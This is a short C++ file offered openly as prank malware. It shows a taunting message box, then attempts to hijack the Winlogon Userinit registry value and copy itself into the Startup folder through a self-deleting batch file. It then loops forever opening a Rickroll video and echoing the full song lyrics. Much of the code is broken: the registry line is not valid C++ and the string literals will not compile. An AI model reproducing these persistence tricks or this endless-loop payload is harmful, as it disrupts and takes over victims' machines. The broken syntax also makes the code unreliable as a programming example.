#include <Windows.h>
#include <shellapi.h>
#include <string.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>

int main(){

	MessageBox(NULL, "SMILE >:)", MB_OK);
	reg add("HKLM\\SOFTWARE\\Microsoft\Windows NT\\CurrentVersion\\Winlogon" \v Userinit \t REG_SZ \d "C:\\Really\\Stupid\\Malware\\binary.exe", "C:\\Windows\\system32\\nakoromo.exe"); // reg key :)
	
	system("echo copy \"nakoromo.exe\" \"%%appdata%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ > "startup.bat");
	system("startup.bat & del startup.bat"); // starts script to copy to startup folder then deletes

	char ur_mom = true;
	while(ur_mom == true){
                FreeConsole(); // >:)
		ShellExecute(0, 0, "https://youtu.be/dQw4w9WgXcQ?autoplay=1", 0, 0, SW_SHOW);
		system("echo We're no strangers to love
			You know the rules and so do I
			A full commitment's what I'm thinking of
			You wouldn't get this from any other guy

			I just wanna tell you how I'm feeling
			Gotta make you understand

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you

			We've known each other for so long
			Your heart's been aching, but
			You're too shy to say it
			Inside, we both know what's been going on
			We know the game and we're gonna play it

			And if you ask me how I'm feeling
			Don't tell me you're too blind to see

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you

			(Ooh, give you up)
			(Ooh, give you up)
			Never gonna give, never gonna give
			(Give you up)
			Never gonna give, never gonna give
			(Give you up)

			We've known each other for so long
			Your heart's been aching, but
			You're too shy to say it
			Inside, we both know what's been going on
			We know the game and we're gonna play it

			I just wanna tell you how I'm feeling
			Gotta make you understand

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you

			Never gonna give you up
			Never gonna let you down
			Never gonna run around and desert you
			Never gonna make you cry
			Never gonna say goodbye
			Never gonna tell a lie and hurt you");
	}
	return 0;
}	 
